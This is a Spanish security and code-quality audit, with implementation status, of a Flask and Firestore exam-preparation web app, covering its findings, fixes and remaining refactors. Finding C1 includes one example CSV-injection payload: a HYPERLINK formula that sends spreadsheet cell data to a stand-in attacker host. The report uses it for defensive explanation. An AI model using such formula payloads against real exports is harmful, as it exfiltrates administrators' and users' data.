# Auditoría de seguridad y calidad — Domina tu Opo (oposicion-age)

**Fecha del informe:** 15 de agosto de 2026 · **Fecha de esta actualización de estado:** 15 de agosto de 2026
**Alcance:** Backend Flask (`app.py`, `blueprints/`, módulos de dominio en raíz), frontend estático (`frontend/`), infraestructura (`render.yaml`, `.github/`, `.pre-commit-config.yaml`, `requirements*.txt`, `.env.example`)
**Método:** Revisión línea a línea de los ficheros clave señalados en la petición, más los blueprints y módulos de negocio de mayor tamaño. Cada hallazgo está verificado contra el código real (archivo + línea); no se han incluido problemas especulativos.

## Estado de implementación

De los 16 puntos de acción del informe original, **11 ya están corregidos**, 1 está corregido solo en parte (por diseño, ver C2) y 4 quedan pendientes — de esos 4, uno (M5) espera datos reales de escala, y los otros tres son decisiones de equipo o refactors grandes que no se pidieron en esta ronda, no vulnerabilidades sin resolver. Además, al implementar los arreglos se encontraron y corrigieron 4 problemas más que no estaban en el informe original (3 dependencias con vulnerabilidades conocidas y 1 excepción silenciada adicional).

| # | Hallazgo | Estado |
|---|---|---|
| C1 | CSV Injection en exportaciones de admin | ✅ Implementado |
| C2 | Resultados de test no verificados en servidor | ⚠️ Implementado en parte (oficial/psicotécnico sí; Test Personalizado no) |
| M1 | Fuga de mensajes de excepción al cliente | ✅ Implementado |
| M2 | Inyección de HTML en avisos oficiales | ✅ Implementado |
| M3 | `banco-preguntas` sin caché + N+1 | ✅ Implementado |
| M4 | `/ranking` sin caché | ✅ Implementado |
| M5 | Escaneos completos en tareas programadas | ❌ Pendiente (decisión: revisar cuando crezca la base de usuarios) |
| M6 | Deduplicación O(n²) bajo lock | ✅ Implementado |
| — | Timing attack en `X-Cron-Key` | ✅ Implementado |
| — | Excepciones silenciadas sin log (`deepseek_utils.py`, `utils.py`) | ✅ Implementado |
| — | `innerHTML` sin red de seguridad en frontend | ✅ Implementado |
| — | Sin SAST de seguridad en pre-commit/CI | ✅ Implementado |
| — | CI lint informativo, no bloqueante | ❌ Pendiente (decisión de equipo, no de código) |
| — | Duplicación `_id_pregunta` (DRY) | ✅ Implementado |
| — | Funciones monolíticas (`pdf_ia.py` y otras) | ❌ Pendiente (refactor grande, no solicitado) |
| — | Otras duplicaciones de código IA | ❌ Pendiente (refactor grande, no solicitado) |

**Encontrado y corregido durante la implementación (no estaba en el informe original):**

- `pypdf` 6.14.2 → 6.15.0: dos vulnerabilidades de denegación de servicio por PDF manipulado — relevante de verdad, la web deja subir PDFs propios.
- `cryptography` 49.0.0 → 50.0.0: oráculo de Bleichenbacher en descifrado PKCS#7 (bajo riesgo real para esta app, pero corregido).
- `h2` 4.4.0 → 4.4.1: request smuggling por Host duplicado en HTTP/2 (uso aquí solo como cliente saliente).
- `blueprints/pagos.py:497`: otro `except Exception: pass` silencioso en el webhook de Stripe, encontrado por `bandit` al añadirlo — ahora registra en el log.

> **Nota sobre el stack real:** el backend no usa SQL/SQLAlchemy — usa **Firestore** (NoSQL) a través del Admin SDK de Firebase, y la autenticación es **Firebase ID Tokens** (no JWT propio ni sesiones Flask). Los apartados de la plantilla de auditoría referidos a "inyección SQL" y "JWT/sesiones" se han adaptado en consecuencia (inyección NoSQL / IDOR, y verificación de Firebase ID Tokens).

---

## Resumen ejecutivo

**Nota original: 8.3 / 10 → prácticamente todo lo accionable ya está corregido y verificado con tests.**

Es un backend inusualmente maduro para el tamaño del equipo: decoradores de autorización aplicados de forma sistemática y verificados uno a uno en **las dos ~2.500 líneas de `admin.py`** y las ~1.700 de `pdf_ia.py`, webhook de Stripe con verificación de firma correcta e idempotente, cabeceras de seguridad estrictas (Talisman + CSP sin `unsafe-inline` en `script-src`), rate limiting por IP y por ruta, manejador global de errores que no filtra trazas, más de 50 ficheros de test que corren en CI y bloquean el propio despliegue en Render si fallan, y `Dependabot` activo semanalmente para pip/npm/GitHub Actions. El frontend, pese a ser JS vanilla sin framework, escapa el HTML de forma consistente en absolutamente todos los puntos donde inserta contenido dinámico vía `innerHTML`, y el token de Firebase nunca se persiste en `localStorage`/`sessionStorage`.

No se encontró ninguna vulnerabilidad de bypass de autenticación/autorización, IDOR, ni inyección con impacto de ejecución remota. El hallazgo de mayor severidad era una **inyección de fórmulas CSV (CSV Injection)** en las exportaciones del panel de administración, explotable por cualquier usuario registrado a través de su propio `display_name`, con impacto real sobre la máquina de un administrador que abra el CSV en Excel/Sheets — **ya corregido (C1)**. El segundo hallazgo relevante no era de confidencialidad sino de **integridad**: el backend confiaba en el contenido y las respuestas correctas que el propio cliente enviaba al guardar un test, lo que permitía fabricar resultados/estadísticas/ranking sin haber contestado nada — **corregido para los tests con banco fijo (oficial/psicotécnico); el Test Personalizado queda pendiente de un rediseño mayor, ver C2**.

El resto de hallazgos eran de severidad media o baja: fuga de mensajes de excepción cruda al cliente (patrón repetido en varios blueprints), inyección de HTML sin escapar en las páginas estáticas de "avisos oficiales" (mitigada en parte por la CSP), varios puntos sin caché con lecturas N+1 a Firestore, y ausencia de herramientas SAST específicas de seguridad (bandit/pip-audit) en el pipeline de pre-commit/CI. **Todos corregidos** (ver tabla de estado arriba), salvo M5 (escaneos completos en tareas programadas, sin datos de escala reales todavía para decidir el diseño correcto).

**Riesgos principales del informe original, de mayor a menor impacto real — todos con su estado actualizado:**

1. CSV Injection en exportaciones de admin (`blueprints/admin.py`) — ✅ corregido.
2. Resultados de test no verificados en servidor — manipulación de estadísticas/ranking (`save_controller.py`, `guardar_resultado.py`) — ⚠️ corregido para oficial/psicotécnico, Test Personalizado pendiente.
3. Fuga de mensajes de excepción interna al cliente en múltiples rutas (`rutas_progreso.py`, `blueprints/pagos.py`, `blueprints/pdf_ia.py`, `blueprints/test_ia.py`) — ✅ corregido.
4. Inyección de HTML sin escapar en páginas estáticas públicas de avisos oficiales (`publicacion_estatica_boe.py`) — ✅ corregido.

---

## Hallazgos críticos (alta prioridad)

### C1. Inyección de fórmulas CSV (CSV/Formula Injection) en exportaciones del panel admin — ✅ IMPLEMENTADO

**Archivo/línea:** `blueprints/admin.py:80-90` (`_respuesta_csv`, helper compartido), usado por `preguntas_export` (~1094-1117), `usuarios_export` (~1189-1206) e `ingresos_export` (~1341-1362).

```python
def _respuesta_csv(cabecera, filas, nombre_fichero):
    """Genera un CSV descargable (UTF-8 con BOM para que Excel respete los
    acentos)."""
    buffer = io.StringIO()
    escritor = csv.writer(buffer)
    escritor.writerow(cabecera)
    escritor.writerows(filas)
    datos = "﻿" + buffer.getvalue()
    return Response(datos, mimetype="text/csv; charset=utf-8", headers={
        "Content-Disposition": f'attachment; filename="{nombre_fichero}"',
    })
```

El campo `nombre` que se vuelca en `usuarios.csv`/`ingresos.csv` proviene del `display_name` de Firebase Auth, que **cualquier usuario elige libremente al registrarse** (`blueprints/auth_publico.py`, alrededor de la línea 81). `csv.writer` no escapa de ningún modo un valor que empiece por `=`, `+`, `-` o `@`.

**Impacto:** un usuario puede registrarse con un nombre como `=HYPERLINK("http://atacante.example/robo?d="&A2,"Ver más")` o una fórmula DDE. Cuando un administrador exporta `usuarios.csv` o `ingresos.csv` desde el panel y lo abre en Excel/Google Sheets, la fórmula se ejecuta en el contexto del administrador: exfiltración de otras celdas del propio fichero (importe de ingresos, emails de otros usuarios), phishing dirigido al administrador, o en configuraciones antiguas de Excel con DDE habilitado, ejecución de comandos en su máquina. Es una vulnerabilidad conocida (OWASP "CSV Injection") con impacto real y de coste de explotación trivial (un simple registro de cuenta).

**Solución:**
```python
_PREFIJOS_PELIGROSOS = ("=", "+", "-", "@", "\t", "\r")

def _celda_segura(valor):
    texto = str(valor)
    if texto.startswith(_PREFIJOS_PELIGROSOS):
        return "'" + texto
    return texto

def _respuesta_csv(cabecera, filas, nombre_fichero):
    buffer = io.StringIO()
    escritor = csv.writer(buffer)
    escritor.writerow(cabecera)
    escritor.writerows([[_celda_segura(c) for c in fila] for fila in filas])
    ...
```
Aplicar `_celda_segura` a cada celda antes de escribirla neutraliza la fórmula sin cambiar el resto del pipeline. Alternativamente, sanear `display_name` en el momento del registro/actualización de perfil (más restrictivo, pero no cubre otros campos de texto libre que puedan añadirse a futuras exportaciones).

---

### C2. Resultados de test no verificados en servidor: manipulación de estadísticas y ranking — ⚠️ IMPLEMENTADO EN PARTE

**Archivo/línea:** `save_controller.py:5-27` (`guardar_test_route`), `guardar_resultado.py:46-156` (`guardar_resultado_en_firestore`), `rutas_progreso.py:217-285` (`/autosave-test`).

```python
# save_controller.py
def guardar_test():
    datos = request.get_json()
    contenido = datos.get("contenido", [])          # <- preguntas Y respuesta_correcta, del cliente
    metadatos["respuestas"] = datos.get("respuestas", [])  # <- respuestas del usuario, del cliente
    resultado = guardar_resultado_en_firestore(
        db=db, tipo="test", contenido=contenido, usuario_id=g.uid,
        metadatos=metadatos, oposicion=obtener_oposicion_solicitada(),
        test_id=datos.get("test_id"), marcadas_duda=marcadas_duda,
    )
```

`guardar_resultado_en_firestore` (`guardar_resultado.py:71-86`) calcula aciertos/fallos comparando `respuestas[i] == p.get("respuesta_correcta")`, donde **tanto la pregunta como la respuesta correcta llegan en el propio payload del cliente**, no se recuperan del banco de preguntas real en el servidor. Lo mismo aplica al primer `/autosave-test` de un test (`rutas_progreso.py:263-280`), que persiste `datos.get("contenido")` tal cual.

**Impacto:** un usuario autenticado (basta con `requiere_login`, ni siquiera hace falta plan de pago salvo el primer autoguardado) puede enviar un `contenido` fabricado donde `respuesta_correcta` sea idéntica a `respuestas`, garantizando el 100% de aciertos. Esto contamina: las estadísticas de `usuarios/{uid}` (`registro_progreso_usuario.py`), el **ranking público** (`blueprints/ranking.py`, que lee de esas estadísticas), la racha de estudio, y cualquier futura funcionalidad de recomendación basada en "rendimiento por tema". No compromete datos de otros usuarios ni concede acceso indebido a funciones de pago, pero rompe la integridad de una función social/competitiva visible (`/ranking`) y de las métricas de progreso que la propia app presenta como fiables.

**Solución:** el servidor debe ser la fuente de verdad de `respuesta_correcta`. Como mínimo para los tests "oficial" y "psicotécnico" (que ya vienen de un banco fijo en Firestore, ver `coleccion_examenes_oficiales`/`coleccion_psicotecnico`), reemplazar la corrección basada en el payload por una relectura server-side:
```python
def _recuperar_respuestas_correctas(db, oposicion, tipo_test, contenido):
    # Para tipos con banco fijo, no confiar en respuesta_correcta del cliente:
    # recuperar el documento real por id (mismo hash que usa banco_fallos)
    # y usar SU respuesta_correcta, ignorando la que venga en el payload.
    ...
```
Para el test "personalizado" (generado por IA bajo demanda, sin persistencia previa por pregunta) es más difícil eliminar la confianza en el cliente sin rediseño; como mitigación intermedia, guardar server-side una copia de las preguntas generadas (asociada al `test_id`) en el momento de generarlas, y corregir contra esa copia en vez de contra lo que llega en `/guardar-test`.

**Estado real:** implementado para "oficial" y "psicotécnico" (`guardar_resultado.py:_corregir_con_banco_oficial`), que sí tienen un banco fijo contra el que verificar sin cambiar el contrato con el cliente — bajo riesgo, cambio contenido. El Test Personalizado queda **deliberadamente sin tocar**: cerrarlo exige el rediseño más grande descrito arriba (persistir lo generado en el momento de generarlo, tocar la ruta SSE más compleja del backend), y se decidió abordarlo en una sesión aparte en vez de mezclarlo con el resto de arreglos de bajo riesgo.

---

## Hallazgos medios

### M1. Fuga de mensajes de excepción interna al cliente (`str(e)`) — ✅ IMPLEMENTADO

Patrón repetido de capturar la excepción y devolver su texto crudo en la respuesta JSON, en vez de un mensaje genérico (contraste con el manejador global `app.py:97-107`, que sí devuelve un mensaje genérico):

- `rutas_progreso.py:214-215, 284-285, 319-320, 335-336, 344-345, 360-361, 404-405`
- `blueprints/pagos.py:179-181, 219-221, 253-256, 269-271, 313-316, 331-333, 357-360, 378-380`
- `blueprints/pdf_ia.py:1493-1495, 1518-1520, 1543-1545, 1568-1570` (`guardar_test_pdf`, `guardar_resumen_pdf`, `guardar_esquema_pdf`, `guardar_tarjetas_pdf`)
- `blueprints/test_ia.py:339-341`

```python
except Exception as e:
    return jsonify({"error": f"Error autoguardando el test: {str(e)}"}), 500
```

**Impacto:** un usuario autenticado puede provocar errores (payloads malformados, límites de Firestore, etc.) y recibir en la respuesta detalles internos: nombres de campos, mensajes de librerías de Google/Stripe, en ocasiones fragmentos de configuración. No es una fuga de credenciales, pero facilita reconocimiento de la implementación interna y es inconsistente con el resto de la app, que sí generaliza el mensaje.

**Solución:** sustituir por un mensaje genérico y dejar el detalle solo en el log (que ya existe en la mayoría de estos bloques vía `logger.exception`):
```python
except Exception:
    logger.exception("Error autoguardando el test")
    return jsonify({"error": "No se pudo autoguardar el test."}), 500
```

### M2. Inyección de HTML sin escapar en páginas estáticas públicas de avisos oficiales — ✅ IMPLEMENTADO

**Archivo/línea:** `publicacion_estatica_boe.py:181-222` (`_tarjeta_aviso_html`).

```python
resumen_html = f'<p class="guia-avisos-oficiales-resumen">{resumen}</p>'
...
enlace_boe = f'<a href="{aviso.get("url_boe")}" target="_blank" rel="noopener">Ver la resolución oficial ↗</a>'
...
<p class="guia-avisos-oficiales-titulo">{aviso.get("titulo", "")}</p>
```

`titulo`, `resumen`, `url_boe` y `url_inap` se interpolan sin `html.escape()` ni equivalente. Este HTML se **comitea directamente** (vía la API de contenidos de GitHub, `_escribir_archivo_github`, `publicacion_estatica_boe.py:156-178`) a `frontend/oposicion-*/index.html` y `frontend/avisos-oficiales/index.html`, páginas estáticas servidas a **todos los visitantes**, autenticados o no.

El origen del dato es doble: (a) detección automática desde el sumario del BOE (`vigilancia_boe.py:550-568`, fuente externa gubernamental — riesgo bajo pero no nulo, incluye además `motivo_ia`, texto generado por IA), y (b) alta/edición manual por cualquier cuenta con el permiso granular `"reportes"` (`blueprints/admin.py:2018-2058, 2104+`), que es un rol de moderación, no el super-admin. En ambos casos el aviso queda en estado `"pendiente"` hasta que alguien con ese mismo permiso lo aprueba — no es una publicación directa, pero **la sanitización debe hacerse en el punto de generación de HTML, no depender de la revisión humana**.

**Impacto real:** la CSP del frontend (`render.yaml:235-237`, `script-src 'self' ...` sin `'unsafe-inline'`) bloquea la ejecución de `<script>` inline y de manejadores de eventos inline (`onerror=`, `onmouseover=`...), por lo que la ejecución de JavaScript arbitrario está mitigada en la práctica. Queda en pie la inyección de **estructura HTML** (enlaces falsos de phishing con texto legítimo, superposición de contenido, ruptura de layout) sin necesidad de JavaScript.

**Solución:**
```python
import html

def _tarjeta_aviso_html(aviso, ...):
    titulo = html.escape(aviso.get("titulo", ""))
    resumen = html.escape((aviso.get("resumen") or "").strip())
    url_boe = html.escape(aviso.get("url_boe") or "", quote=True)
    ...
```
Escapar los cuatro campos de texto y las dos URLs (con `quote=True`, al ir dentro de un atributo `href="..."`) antes de interpolarlos en el f-string.

### M3. Lectura sin caché y N+1 en el resumen del banco de preguntas (panel admin) — ✅ IMPLEMENTADO

**Archivo/línea:** `blueprints/admin.py:627-670` (`banco_preguntas_resumen`).

A diferencia de las rutas hermanas del mismo fichero (`resumen`, `analitica_contenido`, `_todos_usuarios_decorados`, `_fallos_agregados`...), que sí usan el helper `_desde_cache_o_calcular`, esta ruta recorre la colección completa `banco_preguntas_ia_<oposicion>` en cada petición y, por cada `tema_id` distinto encontrado, hace **dos lecturas `.get()` independientes** (`_titulo_tema`/`_titulo_bloque`, líneas 655-656) — incluyendo lecturas repetidas del mismo bloque una vez por cada tema que contiene.

**Impacto:** coste y latencia crecientes de forma lineal con el tamaño del banco (que, según el propio docstring del módulo, está pensado para crecer) en cada carga del panel. No es explotable por un atacante externo (ruta admin), pero es un problema de rendimiento real a medida que crece el banco.

**Solución:** envolver en `_desde_cache_o_calcular` igual que las rutas hermanas, y agrupar las lecturas de título de bloque/tema en un solo batch (`db.get_all(refs)`) en vez de una `.get()` por tema.

### M4. `/ranking` sin caché: lectura completa de la colección en cada petición — ✅ IMPLEMENTADO

**Archivo/línea:** `blueprints/ranking.py:56-79`.

`GET /ranking` hace `.where("ranking_optin", "==", True).stream()` sobre toda la colección `usuarios` en cada llamada, sin límite ni caché, y ordena en Python. Está protegida por `requiere_plan(db, "basico")`, así que no es anónima, pero cualquier usuario de pago puede refrescarla repetidamente.

**Solución:** cachear el top-N ordenado (mismo patrón TTL que ya usa `admin.py` para sus paneles) e invalidar en `/ranking/unirse` y `/ranking/salir`.

### M5. Escaneos completos de la colección `usuarios` en las tareas programadas — ❌ PENDIENTE

**Archivo/línea:** `blueprints/tareas_programadas.py:60, 113, 167` — tres rutas de cron (recordatorio de racha, aviso de fin de prueba, vigilancia de gasto de IA) hacen cada una `db.collection("usuarios").stream()` sobre la colección completa.

**Impacto:** no es N+1 clásico (una sola consulta por ruta), pero son tres recorridos completos independientes de la colección `usuarios` por cada ejecución diaria del cron, sin filtrado del lado de Firestore. Manejable hoy; crecerá linealmente con la base de usuarios.

**Solución:** cuando la colección crezca, sustituir por consultas Firestore acotadas (rango sobre `racha.ultima_fecha`, por ejemplo) en vez de traer y descartar en Python.

**Por qué sigue pendiente:** no hay un arreglo concreto y seguro que aplicar hoy sin datos reales de escala — la propia recomendación es "revisar cuando crezca", no una acción inmediata.

### M6. Deduplicación O(n²) bajo lock en la generación de tests desde PDF — ✅ IMPLEMENTADO

**Archivo/línea:** `test_generator.py:256-317` (`_es_duplicado_por_contencion`), invocada bajo lock en `_intentar_aceptar` (línea 1264) y en `_intentar_aceptar_cruzando_rondas` (línea 1749); tope de banco en `TOPE_BANCO_PREGUNTAS = 100` (línea 1638).

Cada pregunta aceptada se compara contra **todas** las ya aceptadas, dentro de una sección crítica (`lock_dedup`/`lock_acumulacion`) que serializa a todos los hilos de generación en paralelo mientras dura. Con el tope actual (100) son ~5.000 comparaciones en el peor caso; no es grave hoy, pero es un cuello de botella real si se sube el tope.

**Solución:** indexar las candidatas por artículo citado (ya se calcula vía `_articulos_citados`) para comparar solo contra el subconjunto que comparte artículo, reduciendo el coste a casi lineal.

---

## Hallazgos bajos (code smells / malas prácticas)

- **`tareas_programadas.py` (~línea 46-48), comparación de clave de cron no es de tiempo constante — ✅ IMPLEMENTADO:** `request.headers.get("X-Cron-Key") == clave_esperada`. Riesgo teórico de timing attack para adivinar `CRON_SECRET_KEY`; impacto bajo (la ruta solo dispara emails/scraping del BOE, no toca planes ni pagos), pero trivial de corregir con `hmac.compare_digest(...)`.
- **`deepseek_utils.py:183-184, 371-372, 570-571` — ✅ IMPLEMENTADO:** `except Exception: pass` al acumular coste de IA, sin ningún log. Es un best-effort deliberado y documentado, pero un fallo persistente en `coste_ia.py` quedaría invisible en los logs. Añadir `logger.debug(...)` como mínimo.
- **`utils.py:540-543, 583-587` — ✅ IMPLEMENTADO:** `except Exception: return None` sin registrar la excepción al buscar la "respuesta verificada" para Tu Tutor. Degrada con gracia, pero un error real de configuración/permisos de Firestore es indistinguible de "no hay coincidencia" en los logs.
- **`frontend/preguntas-falladas/script.js:44`, `frontend/preguntas-favoritas/script.js:44`, `frontend/repasar-preguntas/script.js:34` — ✅ IMPLEMENTADO:** `mostrarAviso(texto)` asigna `texto` directamente a `innerHTML` en vez de `textContent`. Hoy no es explotable (el backend solo envía cadenas estáticas con un entero interpolado, ver `blueprints/test_ia.py:412-441`), pero es un punto sin red de seguridad ante un futuro cambio de backend que empiece a reflejar texto de usuario en ese campo `mensaje`.
- **`.pre-commit-config.yaml` — ✅ IMPLEMENTADO:** solo tenía hooks de formato/lint (`ruff`, `black`, `prettier`); no había ningún hook de seguridad. Añadidos `bandit` (pre-commit, análisis estático offline) y `pip-audit` (paso de CI, necesita red). Al ejecutarlos de verdad contra el repo aparecieron 3 dependencias con vulnerabilidades conocidas ya corregidas aguas arriba (`pypdf`, `cryptography`, `h2` — ver arriba) y 1 excepción silenciada más en el webhook de Stripe, todo corregido.
- **`.github/workflows/ci.yml` — ❌ PENDIENTE:** los jobs `lint` y `lighthouse` llevan `continue-on-error: true` explícitamente (decisión documentada en el propio YAML como "informativo, no bloquea el PR" mientras se recopila histórico). Sigue así a propósito: es una decisión de equipo sobre cuándo hay ya histórico suficiente, no algo que deba decidirse desde una sesión de arreglos.

### Duplicación de código (DRY) — específicamente en `banco_fallos.py` / `banco_favoritas.py` / `banco_preguntas_ia.py` — ✅ IMPLEMENTADO

- **`banco_fallos.py:27-29` y `banco_favoritas.py:19-21` definen la función `_id_pregunta(oposicion, pregunta)` de forma byte-a-byte idéntica** (mismo hash SHA-256 truncado sobre `f"{oposicion}||{pregunta.strip()}"`). Extraída a `banco_preguntas_comun.py`, del que ambos módulos ahora importan, para no arriesgarse a que diverjan si algún día cambia el esquema de hash en uno y no en el otro (lo que rompería la deduplicación silenciosamente).
- Ambos módulos implementan además una función `ordenar_por_prioridad_repaso(candidatas)` con la misma estructura (`random.shuffle` + `sort` con criterio de antigüedad), aunque con criterios de prioridad legítimamente distintos (fallos con contador vs. favoritas sin él) — aquí la duplicación es más defendible, pero el patrón compartido (barajar-antes-de-ordenar para romper empates) podría extraerse como utilidad de orden superior si aparece una tercera variante.
- `banco_preguntas_ia.py` usa una clave de deduplicación distinta (normalización de texto en minúsculas, no hash) porque cumple un propósito diferente (banco interno, aún sin ruta pública que lo lea) — no comparte lógica real con los otros dos, más allá del propósito general de "banco de preguntas por oposición".

### Funciones monolíticas (>150-200 líneas) — ❌ PENDIENTE (refactor grande, no solicitado)

| Archivo | Función | Líneas | Nota |
|---|---|---|---|
| `blueprints/pdf_ia.py` | `resumir_pdf` | 238-479 (~241) | Mezcla validación, prompt, SSE, hilo de fondo y persistencia — patrón repetido en las rutas hermanas de esquema/test/tarjetas |
| `blueprints/pdf_ia.py` | `generar_esquema_desde_pdf` | 492-712 (~220) | Mismo patrón que arriba |
| `blueprints/pdf_ia.py` | `generar_test_desde_pdf` | 718-891 (~173) | Mismo patrón que arriba |
| `deepseek_utils.py` | `generar_documento_largo_por_partes` | 821-1338 (~518) | Tiene 4 closures internas bien diferenciadas; extraerlas a nivel de módulo ayudaría a la legibilidad |
| `test_generator.py` | `generar_preguntas_ia_en_lotes` | 1084-1662 (~578) | Misma forma que la anterior (6 closures anidadas) |
| `generador_preguntas_verificado.py` | `generar_test_verificado` | 903-1147 (~245) | Fases ya bien comentadas; se podrían nombrar como funciones propias |
| `chat_controller.py` | `_preparar_contexto` | 916-1119 (~204) | Dos ramas (RAG vs. genérica) suficientemente distintas para separarse |

Ninguna de estas resulta de complejidad accidental — el propio código documenta, con comentarios extensos, la casuística real de producción que motiva cada rama — pero su tamaño eleva el coste de incorporación de nuevas personas al equipo y el riesgo de introducir regresiones al tocarlas.

### Otras duplicaciones (Código IA) — ❌ PENDIENTE (refactor grande, no solicitado)

- `chat_controller.py:431-499` (`_bloque_explicar_fallo`) y `chat_controller.py:870-913` (`_bloque_respuesta_verificada`) repiten la misma lógica de parseo de explicación por opción y el mismo texto de aviso final ("no inviertas esta conclusión"), solo cambia el encabezado. Candidatas a un helper común `_bloque_letra_verificada(...)`.
- `generador_preguntas_verificado.py:303-362, 365-428, 431-474` — tres prompts que repiten el mismo esqueleto de "reglas inquebrantables" con solo el dominio (jurídico/descriptivo/lote) cambiando. Plantillable para reducir el riesgo de que diverjan al ajustar una regla en solo uno de los tres.
- `test_generator.py` (pipeline PDF) y `generador_preguntas_verificado.py` (pipeline Test Personalizado) implementan cada uno su propio "generar → verificar → reintentar → deduplicar" con `ThreadPoolExecutor`, lock de deduplicación y callback de progreso. Justificado arquitectónicamente (fuentes de entrada distintas), pero el boilerplate de orquestación de hilos es duplicado y podría extraerse sin tocar la lógica de negocio de cada uno.

---

## Checklist de mejora continua

- [x] Sanear las celdas de todas las exportaciones CSV del panel admin contra CSV injection (C1).
- [x] Dejar de confiar en `respuesta_correcta`/`contenido` del cliente al guardar resultados de test oficial/psicotécnico; recalcular server-side contra el banco real (C2) — hecho para oficial/psicotécnico; Test Personalizado pendiente de una sesión aparte.
- [x] Unificar el manejo de errores en `rutas_progreso.py`, `pagos.py`, `pdf_ia.py` y `test_ia.py` para no devolver `str(e)` al cliente (M1).
- [x] Escapar HTML (`html.escape`) en `publicacion_estatica_boe.py._tarjeta_aviso_html` antes de comitear a las páginas estáticas (M2).
- [x] Envolver `banco_preguntas_resumen` en el mismo caché TTL que sus rutas hermanas de `admin.py`, y batchear las lecturas de título de tema/bloque (M3).
- [x] Cachear `/ranking` con invalidación en unirse/salir (M4).
- [ ] Revisar el escaneo completo de `usuarios` en las tres tareas de `tareas_programadas.py` cuando la base de usuarios crezca (M5) — pendiente, no hay datos de escala reales todavía.
- [x] Indexar por artículo citado la deduplicación de `test_generator.py` para evitar el O(n²) bajo lock si se sube `TOPE_BANCO_PREGUNTAS` (M6).
- [x] Sustituir la comparación `==` de `X-Cron-Key` por `hmac.compare_digest`.
- [x] Añadir logging a los `except Exception: pass`/`return None` silenciosos de `deepseek_utils.py` y `utils.py`.
- [x] Cambiar `innerHTML` por `textContent` en `mostrarAviso` (`preguntas-falladas`, `preguntas-favoritas`, `repasar-preguntas`) como defensa en profundidad.
- [x] Añadir `bandit` (Python) y `pip-audit` al pipeline de `pre-commit`/CI, complementando a Dependabot — de paso, corrigieron 3 CVEs reales en dependencias y 1 excepción silenciada más.
- [x] Extraer `_id_pregunta` a un módulo común compartido entre `banco_fallos.py` y `banco_favoritas.py`.
- [ ] Revisar si ya toca convertir `lint`/`lighthouse` en CI de informativos a bloqueantes, según lo previsto en el propio comentario del workflow — decisión de equipo, pendiente.
- [ ] Considerar dividir las rutas más largas de `pdf_ia.py` (`resumir_pdf`, `generar_esquema_desde_pdf`, `generar_test_desde_pdf`) extrayendo el esqueleto común "SSE + hilo de fondo + progreso + persistencia + devolución de cuota si falla" — refactor grande, pendiente.

---

## Puntos fuertes

- **Autorización consistente y verificada exhaustivamente:** los cuatro decoradores (`requiere_login`, `requiere_admin`, `requiere_permiso`, `requiere_plan`) se aplican de forma sistemática; una revisión línea a línea de **todas** las rutas de `admin.py` (2.539 líneas) y `pdf_ia.py` (1.713 líneas), más `pagos.py`, `test_ia.py`, `tu_tutor.py`, `temario.py`, `tareas_programadas.py`, `ranking.py` y `auth_publico.py`, no encontró ninguna ruta administrativa o de pago desprotegida, ni ningún IDOR (todo acceso a subcolecciones de usuario está anclado a `g.uid`, nunca a un id que llegue del cliente).
- **Stripe implementado correctamente:** el webhook (`/webhook-stripe`) verifica la firma con `stripe.Webhook.construct_event` y es idempotente vía `stripe_events/{event_id}`; los importes/planes de checkout se resuelven server-side contra `STRIPE_PRICE_ID_*`, nunca desde datos que envíe el cliente — sin vector de manipulación de precio.
- **Cabeceras de seguridad estrictas:** `Flask-Talisman` en el backend + CSP explícita sin `'unsafe-inline'` en `script-src`, HSTS, `X-Frame-Options: DENY`, `X-Content-Type-Options`, `Permissions-Policy` en el frontend estático (`render.yaml`).
- **Rate limiting por capas:** límite global de 200/h por IP, `/health` a 30/min, y el blueprint completo de `auth_publico` (incluye `/recuperar-contrasena` y `/enviar-verificacion-email`) limitado aparte a 8/h — correctamente pensado contra abuso de envío de emails (verificado directamente en `app.py:167`).
- **Manejador global de errores sin fuga de trazas:** `@app.errorhandler(Exception)` en `app.py:97-107` devuelve un mensaje genérico y registra la excepción completa solo en el log (los hallazgos M1 son casos que se saltan este manejador con su propio `try/except`, no un fallo del manejador en sí).
- **Frontend consistentemente protegido contra XSS:** todo punto que inserta contenido dinámico vía `innerHTML` pasa por un helper local de escape (`escaparHtml`/`escapeHtml`); no existe ni un solo `eval(`, `document.write(` o `new Function(` en todo el frontend; ni una sola clave de servidor filtrada al cliente.
- **Tokens manejados correctamente en cliente:** el ID token de Firebase nunca se persiste en `localStorage`/`sessionStorage` — se obtiene al vuelo con `getIdToken()` en cada petición y viaja solo en la cabecera `Authorization`, nunca en URL.
- **Condiciones de carrera activamente mitigadas:** `inicializar_estadisticas_usuario` (creación de usuario) y `registrar_uso`/`devolver_uso` (contadores de cuota de IA) usan transacciones de Firestore explícitamente para evitar duplicados/pérdida de incrementos ante peticiones concurrentes — con comentarios que documentan el bug real de producción que motivó el cambio.
- **Suite de tests extensa y con gate real de despliegue:** más de 50 ficheros en `tests/`, ejecutados en CI (`ci.yml`) y como parte del propio `buildCommand` en Render (`render.yaml:12`) — un test roto bloquea el despliegue en vez de subir código roto a producción.
- **Dependencias:** versiones exactas fijadas en `requirements.txt`/`requirements-dev.txt` (reproducibilidad) y `Dependabot` configurado semanalmente para `pip`, `npm` y `github-actions` (`.github/dependabot.yml`) — no se han encontrado secretos hardcodeados ni en el código ni en el historial de git.
- **`.env.example` ejemplar:** documenta cada variable, su efecto si se deja vacía, y por qué existe cada una — reduce el riesgo de despliegues con configuración a medias.
- **Buen tratamiento de RGPD:** `gestion_cuenta.py` centraliza exportación y borrado de cuenta, con el orden correcto (cancelar Stripe → borrar Auth → borrar Firestore) para no dejar huérfanos ante fallos parciales; lista de dominios de correo desechable para frenar el farming de la prueba gratuita de 7 días.
- **Ausencia de rutas de IA vulnerables a inyección con efecto real:** el equipo que revisó `chat_controller.py`, `deepseek_utils.py`, `generador_preguntas_verificado.py` y `test_generator.py` no encontró ningún camino donde la salida del modelo de IA se renderice como HTML crudo o se pase a un intérprete/`eval`/shell — toda salida de IA se trata como texto o se parsea a un esquema JSON tipado antes de usarse.

---

## Nota metodológica

Todos los hallazgos anteriores han sido verificados leyendo el código real señalado (archivo y línea). No se ha reportado ningún problema sin confirmarlo contra el fichero correspondiente, y se ha descartado explícitamente al menos una hipótesis inicial (falta de rate limiting en `/recuperar-contrasena`) tras comprobar en `app.py:160-167` que sí está cubierta. No se han encontrado ficheros mencionados en la petición original que no existan en el repositorio.

Los estados de implementación (Implementado / Implementado en parte / Pendiente) de esta actualización se han verificado ejecutando la suite de tests completa (1098 tests) y las propias herramientas añadidas (`bandit`, `pip-audit`, `ruff`) tras cada cambio, no solo revisando el código a simple vista.
